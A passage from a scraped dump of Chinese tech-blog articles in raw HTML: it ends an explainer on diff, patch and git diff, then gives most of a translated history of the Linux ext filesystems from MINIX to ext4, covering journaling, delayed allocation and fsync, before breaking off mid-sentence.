class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6701e98d1210157047-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6701e98d1210157047-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6701e98d1210157047-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6701e98d1210157047-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">patch</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">p1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">myfixes</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">patch</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6701e98d1210157047-2\"><span class=\"crayon-e\">patching </span><span class=\"crayon-e\">file </span><span class=\"crayon-v\">officespace</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">interest</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">go</span></div><div class=\"crayon-line\" id=\"crayon-5bab6701e98d1210157047-3\"><span class=\"crayon-v\">Hunk</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\">#1 succeeded at 26 (offset 15 lines).</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>在这个例子中，补丁警告说代码改动并不在文件原来的地方而是偏移了 15 行。如果你文件改动的很厉害，补丁可能干脆说找不到要应用的地方，还好补丁程序提供了提供了打开“模糊”匹配的选项（这个选项在文档里有预置的警告信息，对其讲解已经超出了本文的范围）。</p>\n<p>如果你使用 Git 或者 GitHub 的话，你可能不会直接使用补丁或差异。Git 已经内置了这些功能，你能使用这些功能和共享一个源代码树的其他开发者交互，拉取或合并代码。Git 一个比较相近的功能是可以使用 <code>git diff</code> 来对你的本地代码树生成全局差异，又或者对你的任意两次”引用“（可能是一个代表提交的数字，或一个标记或分支的名字，等等）做全局补丁。你甚至能简单的用管道将 <code>git diff</code> 的输出到一个文件里（这个文件必须严格符合将要被使用它的程序的输入要求），然后将这个文件交给一个并不使用 Git 的开发者应用到他的代码上。当然，GitHub 把这些功能放到了 Web 上，你能直接在 Web 页面上查看一个拉取请求的文件变动。在 Web 上你能看到所展示的合并差异，GitHub 还允许你将这些代码改动下载为原始的补丁文件。</p>\n<h3 id=\"toc_3\">总结</h3>\n<p>好了，你已经学到了”差异“和”补丁“是什么，以及在 Unix/Linux 上怎么使用命令行工具和它们交互。除非你还在像 Linux 内核开发这样的项目中工作而使用完全基于补丁文件的开发方式，你应该会主要通过你的源代码控制系统（如 Git）来使用补丁。但熟悉像 GitHub 这样的高级别工具的技术背景和技术底层对你的工作也是大有裨益的。谁知道会不会有一天你需要和一个来自 Linux 世界邮件列表的补丁包打交道呢？</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114385\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114385votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114385\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/eb506ae0667dbbe488b212b50ee2a090282746df.jpg"}
{"title": "深入理解 ext4 等 Linux 文件系统", "url": "http://blog.jobbole.com/114377/", "create_date": "2018/09/12", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/09/623fff738e3b78d500adde9b8202bb80.jpg"], "url_object_id": "b6918daaa8466b9de64b62b1fab0b21c", "praise_nums": 1, "fav_nums": 1, "comment_nums": 0, "tags": "IT技术,Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://opensource.com/article/18/4/ext4-filesystem\">Jim Salter</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-10000-1.html\">Linux中国/魑魅魍魉</a>   </div><blockquote><p>了解 ext4 的历史，包括其与 ext3 和之前的其它文件系统之间的区别。</p></blockquote>\n<p>目前的大部分 Linux 文件系统都默认采用 ext4 文件系统，正如以前的 Linux 发行版默认使用 ext3、ext2 以及更久前的 ext。</p>\n<p>对于不熟悉 Linux 或文件系统的朋友而言，你可能不清楚 ext4 相对于上一版本 ext3 带来了什么变化。你可能还想知道在一连串关于替代的文件系统例如 Btrfs、XFS 和 ZFS 不断被发布的情况下，ext4 是否仍然能得到进一步的发展。</p>\n<p>在一篇文章中，我们不可能讲述文件系统的所有方面，但我们尝试让你尽快了解 Linux 默认文件系统的发展历史，包括它的诞生以及未来发展。</p>\n<p>我仔细研究了维基百科里的各种关于 ext 文件系统文章、kernel.org 的 wiki 中关于 ext4 的条目以及结合自己的经验写下这篇文章。</p>\n<h3 id=\"toc_1\">ext 简史</h3>\n<h4 id=\"toc_2\">MINIX 文件系统</h4>\n<p>在有 ext 之前，使用的是 MINIX 文件系统。如果你不熟悉 Linux 历史，那么可以理解为 MINIX 是用于 IBM PC/AT 微型计算机的一个非常小的类 Unix 系统。Andrew Tannenbaum 为了教学的目的而开发了它，并于 1987 年发布了源代码（以印刷版的格式！）。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/623fff738e3b78d500adde9b8202bb80.jpg\" alt=\"\"></p>\n<p style=\"text-align: center\"><em>IBM 1980 中期的 PC/AT，<a href=\"https://commons.wikimedia.org/wiki/File:IBM_PC_AT.jpg\">MBlairMartin</a>，<a href=\"https://creativecommons.org/licenses/by-sa/4.0/deed.en\">CC BY-SA 4.0</a></em></p>\n<p>虽然你可以细读 MINIX 的源代码，但实际上它并不是自由开源软件（FOSS）。出版 Tannebaum 著作的出版商要求你花 69 美元的许可费来运行 MINIX，而这笔费用包含在书籍的费用中。尽管如此，在那时来说非常便宜，并且 MINIX 的使用得到迅速发展，很快超过了 Tannebaum 当初使用它来教授操作系统编码的意图。在整个 20 世纪 90 年代，你可以发现 MINIX 的安装在世界各个大学里面非常流行。而此时，年轻的 Linus Torvalds 使用 MINIX 来开发原始 Linux 内核，并于 1991 年首次公布，而后在 1992 年 12 月在 GPL 开源协议下发布。</p>\n<p>但是等等，这是一篇以 <em>文件系统</em> 为主题的文章不是吗？是的，MINIX 有自己的文件系统，早期的 Linux 版本依赖于它。跟 MINIX 一样，Linux 的文件系统也如同玩具那般小 —— MINIX 文件系统最多能处理 14 个字符的文件名，并且只能处理 64MB 的存储空间。到了 1991 年，一般的硬盘尺寸已经达到了 40-140 MB。很显然，Linux 需要一个更好的文件系统。</p>\n<h4 id=\"toc_3\">ext</h4>\n<p>当 Linus 开发出刚起步的 Linux 内核时，Rémy Card 从事第一代的 ext 文件系统的开发工作。ext 文件系统在 1992 年首次实现并发布 —— 仅在 Linux 首次发布后的一年！—— ext 解决了 MINIX 文件系统中最糟糕的问题。</p>\n<p>1992 年的 ext 使用在 Linux 内核中的新虚拟文件系统（VFS）抽象层。与之前的 MINIX 文件系统不同的是，ext 可以处理高达 2 GB 存储空间并处理 255 个字符的文件名。</p>\n<p>但 ext 并没有长时间占统治地位，主要是由于它原始的时间戳（每个文件仅有一个时间戳，而不是今天我们所熟悉的有 inode、最近文件访问时间和最新文件修改时间的时间戳。）仅仅一年后，ext2 就替代了它。</p>\n<h4 id=\"toc_4\">ext2</h4>\n<p>Rémy 很快就意识到 ext 的局限性，所以一年后他设计出 ext2 替代它。当 ext 仍然根植于 “玩具” 操作系统时，ext2 从一开始就被设计为一个商业级文件系统，沿用 BSD 的 Berkeley 文件系统的设计原理。</p>\n<p>ext2 提供了 GB 级别的最大文件大小和 TB 级别的文件系统大小，使其在 20 世纪 90 年代的地位牢牢巩固在文件系统大联盟中。很快它被广泛地使用，无论是在 Linux 内核中还是最终在 MINIX 中，且利用第三方模块可以使其应用于 MacOS 和 Windows。</p>\n<p>但这里仍然有一些问题需要解决：ext2 文件系统与 20 世纪 90 年代的大多数文件系统一样，如果在将数据写入到磁盘的时候，系统发生崩溃或断电，则容易发生灾难性的数据损坏。随着时间的推移，由于碎片（单个文件存储在多个位置，物理上其分散在旋转的磁盘上），它们也遭受了严重的性能损失。</p>\n<p>尽管存在这些问题，但今天 ext2 还是用在某些特殊的情况下 —— 最常见的是，作为便携式 USB 驱动器的文件系统格式。</p>\n<h4 id=\"toc_5\">ext3</h4>\n<p>1998 年，在 ext2 被采用后的 6 年后，Stephen Tweedie 宣布他正在致力于改进 ext2。这成了 ext3，并于 2001 年 11 月在 2.4.15 内核版本中被采用到 Linux 内核主线中。</p>\n<p style=\"text-align: center\"><img title=\"Packard Bell computer\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/584f10332acf325015ae984a7930d715.jpg\" alt=\"Packard Bell 计算机\"></p>\n<p style=\"text-align: center\"><em>20 世纪 90 年代中期的 Packard Bell 计算机，<a href=\"https://commons.wikimedia.org/wiki/File:Old_packard_bell_pc.jpg\">Spacekid</a>，<a href=\"https://creativecommons.org/publicdomain/zero/1.0/deed.en\">CC0</a></em></p>\n<p>在大部分情况下，ext2 在 Linux 发行版中工作得很好，但像 FAT、FAT32、HFS 和当时的其它文件系统一样 —— 在断电时容易发生灾难性的破坏。如果在将数据写入文件系统时候发生断电，则可能会将其留在所谓 <em>不一致</em> 的状态 —— 事情只完成一半而另一半未完成。这可能导致大量文件丢失或损坏，这些文件与正在保存的文件无关甚至导致整个文件系统无法卸载。</p>\n<p>ext3 和 20 世纪 90 年代后期的其它文件系统，如微软的 NTFS，使用 <em>日志</em> 来解决这个问题。日志是磁盘上的一种特殊的分配区域，其写入被存储在事务中；如果该事务完成磁盘写入，则日志中的数据将提交给文件系统自身。如果系统在该操作提交前崩溃，则重新启动的系统识别其为未完成的事务而将其进行回滚，就像从未发生过一样。这意味着正在处理的文件可能依然会丢失，但文件系统 <em>本身</em> 保持一致，且其它所有数据都是安全的。</p>\n<p>在使用 ext3 文件系统的 Linux 内核中实现了三个级别的日志记录方式：日记journal、顺序ordered和回写writeback。</p>\n<ul>\n<li><strong>日记</strong> 是最低风险模式，在将数据和元数据提交给文件系统之前将其写入日志。这可以保证正在写入的文件与整个文件系统的一致性，但其显著降低了性能。</li>\n<li><strong>顺序</strong> 是大多数 Linux 发行版默认模式；顺序模式将元数据写入日志而直接将数据提交到文件系统。顾名思义，这里的操作顺序是固定的：首先，元数据提交到日志；其次，数据写入文件系统，然后才将日志中关联的元数据更新到文件系统。这确保了在发生崩溃时，那些与未完整写入相关联的元数据仍在日志中，且文件系统可以在回滚日志时清理那些不完整的写入事务。在顺序模式下，系统崩溃可能导致在崩溃期间文件的错误被主动写入，但文件系统它本身 —— 以及未被主动写入的文件 —— 确保是安全的。</li>\n<li><strong>回写</strong> 是第三种模式 —— 也是最不安全的日志模式。在回写模式下，像顺序模式一样，元数据会被记录到日志，但数据不会。与顺序模式不同，元数据和数据都可以以任何有利于获得最佳性能的顺序写入。这可以显著提高性能，但安全性低很多。尽管回写模式仍然保证文件系统本身的安全性，但在崩溃或崩溃之前写入的文件很容易丢失或损坏。</li>\n</ul>\n<p>跟之前的 ext2 类似，ext3 使用 16 位内部寻址。这意味着对于有着 4K 块大小的 ext3 在最大规格为 16 TiB 的文件系统中可以处理的最大文件大小为 2 TiB。</p>\n<h4 id=\"toc_6\">ext4</h4>\n<p>Theodore Ts’o（是当时 ext3 主要开发人员）在 2006 年发表的 ext4，于两年后在 2.6.28 内核版本中被加入到了 Linux 主线。</p>\n<p>Ts’o 将 ext4 描述为一个显著扩展 ext3 但仍然依赖于旧技术的临时技术。他预计 ext4 终将会被真正的下一代文件系统所取代。</p>\n<p style=\"text-align: center\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/a73a15786bd47bc5be9d70bb101e280b.jpg\" alt=\"\"></p>\n<p style=\"text-align: center\"><em>Dell Precision 380 工作站，<a href=\"https://commons.wikimedia.org/wiki/File:Dell_Precision_380_Workstation.jpeg\">Lance Fisher</a>，<a href=\"https://creativecommons.org/licenses/by-sa/2.0/deed.en\">CC BY-SA 2.0</a></em></p>\n<p>ext4 在功能上与 ext3 在功能上非常相似，但支持大文件系统，提高了对碎片的抵抗力，有更高的性能以及更好的时间戳。</p>\n<h3 id=\"toc_7\">ext4 vs ext3</h3>\n<p>ext3 和 ext4 有一些非常明确的差别，在这里集中讨论下。</p>\n<h4 id=\"toc_8\">向后兼容性</h4>\n<p>ext4 特地设计为尽可能地向后兼容 ext3。这不仅允许 ext3 文件系统原地升级到 ext4；也允许 ext4 驱动程序以 ext3 模式自动挂载 ext3 文件系统，因此使它无需单独维护两个代码库。</p>\n<h4 id=\"toc_9\">大文件系统</h4>\n<p>ext3 文件系统使用 32 位寻址，这限制它仅支持 2 TiB 文件大小和 16 TiB 文件系统系统大小（这是假设在块大小为 4 KiB 的情况下，一些 ext3 文件系统使用更小的块大小，因此对其进一步被限制）。</p>\n<p>ext4 使用 48 位的内部寻址，理论上可以在文件系统上分配高达 16 TiB 大小的文件，其中文件系统大小最高可达 1000000 TiB（1 EiB）。在早期 ext4 的实现中有些用户空间的程序仍然将其限制为最大大小为 16 TiB 的文件系统，但截至 2011 年，e2fsprogs 已经直接支持大于 16 TiB 大小的 ext4 文件系统。例如，红帽企业 Linux 在其合同上仅支持最高 50 TiB 的 ext4 文件系统，并建议 ext4 卷不超过 100 TiB。</p>\n<h4 id=\"toc_10\">分配方式改进</h4>\n<p>ext4 在将存储块写入磁盘之前对存储块的分配方式进行了大量改进，这可以显著提高读写性能。</p>\n<h5 id=\"toc_11\">区段</h5>\n<p>区段extent是一系列连续的物理块 (最多达 128 MiB，假设块大小为 4 KiB），可以一次性保留和寻址。使用区段可以减少给定文件所需的 inode 数量，并显著减少碎片并提高写入大文件时的性能。</p>\n<h5 id=\"toc_12\">多块分配</h5>\n<p>ext3 为每一个新分配的块调用一次块分配器。当多个写入同时打开分配器时，很容易导致严重的碎片。然而，ext4 使用延迟分配，这允许它合并写入并更好地决定如何为尚未提交的写入分配块。</p>\n<h5 id=\"toc_13\">持久的预分配</h5>\n<p>在为文件预分配磁盘空间时，大部分文件系统必须在创建时将零写入该文件的块中。ext4 允许替代使用 <code>fallocate()</code>，它保证了空间的可用性（并试图为它找到连续的空间），而不需要先写入它。这显著提高了写入和将来读取流和数据库应用程序的写入数据的性能。</p>\n<h5 id=\"toc_14\">延迟分配</h5>\n<p>这是一个耐人寻味而有争议性的功能。延迟分配允许 ext4 等待分配将写入数据的实际块，直到它准备好将数据提交到磁盘。（相比之下，即使数据仍然在往写入缓存中写入，ext3 也会立即分配块。）</p>\n<p>当缓存中的数据累积时，延迟分配块允许文件系统对如何分配块做出更好的选择，降低碎片（写入，以及稍后的读）并显著提升性能。然而不幸的是，它 <em>增加</em> 了还没有专门调用 <code>fsync()</code> 方法（当程序员想确保数据完全刷新到磁盘时）的程序的数据丢失的可能性。</p>\n<p>假设一个程序完全重写了一个文件：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6702d0024883281179\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfd=open(\"file\", O_TRUNC); write(fd, data); close(fd);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6702d0024883281179-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6702d0024883281179-1\"><span class=\"crayon-v\">fd</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">open</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"file\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">O_TRUNC</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">write</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">fd</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">close</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">fd</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>使用旧的文件系统，<code>close(fd);</code> 足以保证 <code>file</code> 中的内容刷新到磁盘。即使严格来说，写不是事务性的，但如果文件关闭后发生崩溃，则丢失数据的风险很小。</p>\n<p>如果写入不成功（由于程序上的错误、磁盘上的错误、断电等），文件的原始版本和较新版本都可能丢失数据或损坏。如果其它进程在写入文件时访问文件，则会看到损坏的版本。如果其它进程打开文件并且不希望其内容发生更改 —— 例如，映射到多个正在运行的程序的共享库。这些进程可能会崩溃。</p>\n<p>为了避免这些问题，一些程序员完全避免使用 <code>O_TRUNC</code>。相反，他们可能会写入一个新文件，关闭它，然后将其重命名为旧文件名：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6702d002f190335778\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfd=open(\"newfile\"); write(fd, data); close(fd); rename(\"newfile\", \"file\");</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6702d002f190335778-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6702d002f190335778-1\"><span class=\"crayon-v\">fd</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">open</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"newfile\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">write</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">fd</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">close</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">fd</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">rename</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"newfile\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"file\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>在 <em>没有</em> 延迟分配的文件系统下，这足以避免上面列出的潜在的损坏和崩溃问题：因为 <code>rename()</code> 是原子操作，所以它不会被崩溃中断；并且运行的程序将继续引用旧的文件。现在 <code>file</code> 的未链接版本只要有一个打开的文件文件句柄即可。但是因为 ext4 的延迟分配会导致写入被延迟和重新排序，<code>rename(\"newfile\", \"file\")</code> 可以在 <code>newfile</code> 的内容实际写入磁盘内容之前执行，这出现了并行进行再次获得 <code>file</code> 坏版本的问题。</p>\n<p>为了缓解这种情况，Linux 内核（自版本 2.6.30）尝试检测这些常见代码情况并强制立即分配。这会减少但不能防止数据丢失的可能性 —— 并且它对新文件没有任何帮助。如果你是一位开发人员，请注意：保证数据立即写入磁盘的唯一方法是正确调用 <code>fsync()</code>。</p>\n<h4 id=\"toc_15\">无限制的子目录</h4>\n<p>ext3 仅限于 32000 个子目录；ext4 允许无限数量的子目录。从 2.6.23 内核版本开始，ext4 使用 HTree 索引来减少大量子目录的性能损失。</p>\n<h4 id=\"toc_16\">日志校验</h4>\n<p>ext3 没有对日志进行校验，这给处于内核直接控制之外的磁盘或自带缓存的控制器设备带来了问题。如果控制器或具自带缓存的磁盘脱离了写入顺序，则可能会破坏 ext3 的日记事务顺序，从而可能破坏在崩溃期间（或之前一段时间）写入的文件。</p>\n<p>理论上，这个问题可以使用写入障碍barrier —— 在安装文件系统时，你在挂载选项设置 <code>barrier=1</code>，然后设备就会忠实地执行 <code>fsync</code> 一直向下到底层硬件。通过实践，可以发现存储设备和控制器经常不遵守写入障碍 —— 提高性能（和跟竞争对手比较的性能基准），但增加了本应该防止数据损坏的可能性。</p>\n<p>对日志进行校验和允许文件系统崩溃后第一次挂载时意识到其某些条目是无效或无序的。因此，这避免了回滚部分条目或无序日志条目的错误，并进一步损坏的文件系统 —— 即使部分存储设备假做或不遵守写入障碍。</p>\n<h4 id=\"toc_17\">快速文件系统检查</h4>\n<p>在 ext3 下，在 <code>fsck</code> 被调用时会检查整个文件系统 —— 包括已删除或空文件。相比之下，ext4 标记了 inode 表未分配的块和扇区，从而允许 <code>fsck</code> 完全跳过它们。这大大减少了在大多数文件系统上运行 <code>fsck</code> 的时间，它实现于内核 2.6.24。</p>\n<h4 id=\"toc_18\">改进的时间戳</h4>\n<p>ext3 提供粒度为一秒的时间戳。虽然足以满足大多数用途，但任务关键型应用程序经常需要更严格的时间控制。ext4 通过提供纳秒级的时间戳，使其可用于那些企业、科学以及任务关键型的应用程序。</p>\n<p>ext3 文件系统也没有提供足够的位来存储 2038 年 1 月 18 日以后的日期。ext4 在这里增加了两个位，将 <a href=\"https://en.wikipedia.org/wiki/Unix_time\">Unix 纪元</a>扩展了 408 年。如果你在公元 2446 年读到这篇文章，你很有可能已经转移到一个更好的文件系统 —— 如果你还在测量自 1970 年 1 月 1 日 00:00（UTC）以来的时间，这会让我死后得以安眠。</p>\n<h4 id=\"toc_19\">在线碎片整理</h4>\n<p>ext2 和 ext3 都不直接支持在线碎片整理 —— 即在挂载时会对文件系统进行碎片整理。ext2 有一个包含的实用程序 <code>e2defrag</code>，它的名字暗示 —— 它需要在文件系统未挂载时脱机运行。（显然，这对于根文件系统来说非常有问题。）在 ext3 中的情况甚至更糟糕 —— 虽然 ext3 比 ext2 更不容易受到严重碎片的影响，但 ext3 文件系统运行 <code>e2defrag</code> 可能会导致灾难性损坏和数据丢失。</p>\n<p>尽管 ext3 最初被认为“不受碎片影响”，但对同一文件（例如 BitTorrent）采用大规模并行写入过程的过程清楚地表明情况并非完全如此。一些用户空间的手段和解决方法，例如 <a href=\"https://vleu.net/shake/\">Shake</a>，以这样或那样方式解决了这个问题 —— 但它们比真正的、文件系统感知的、内核级碎片整理过程更慢并且在各方面都不太令人满意。</p>\n<p>ext4 通过 <code>e4defrag</code> 解决了这个问题，且是一个在线、内核模式、文件系统感知、块和区段级别的碎片整理实用程序。</p>\n<h3 id=\"toc_20\">正在进行的 ext4 开发</h3>\n<p>ext4，正如 Monty Python 中瘟疫感染者曾经说过的那样，“我还没死呢！”虽然它的<a href=\"http://www.linux-mag.com/id/7272/\">主要开发人员</a>认为它只是一个真正的<a href=\"https://arstechnica.com/information-technology/2014/01/bitrot-and-atomic-cows-inside-next-gen-filesystems/\">下一代文件系统</a>的权宜之计，但是在一段时间内，没有任何可能的候选人准备好（由于技术或许可问题）部署为根文件系统。</p>\n<p>在未来的 ext4 版本中仍然有一些关键功能要开发，包括元数据校验和、一流的配额支持和大分配块。</p>\n<h4 id=\"toc_21\">元数据校验和</h4>\n<p>由于 ext4 具有冗余超级块，因此为文件系统校验其中的元数据提供了一种方法，可以自行确定主超级块是否已损坏并需要使用备用块。可以在没有校验和的情况下，从损坏的超级块恢复 —— 但是用户首先需要意识到它已损坏，然后尝试使用备用方法手动挂载文件系统。由于在某些情况下，使用损坏的主超级块安装文件系统读写可能会造成进一步的损坏，即使是经验丰富的用户也无法避免，这也不是一个完美的解决方案！</p>\n<p>与 Btrfs 或 ZFS 等下一代文件系统提供的极其强大的每块校验和相比，ext4 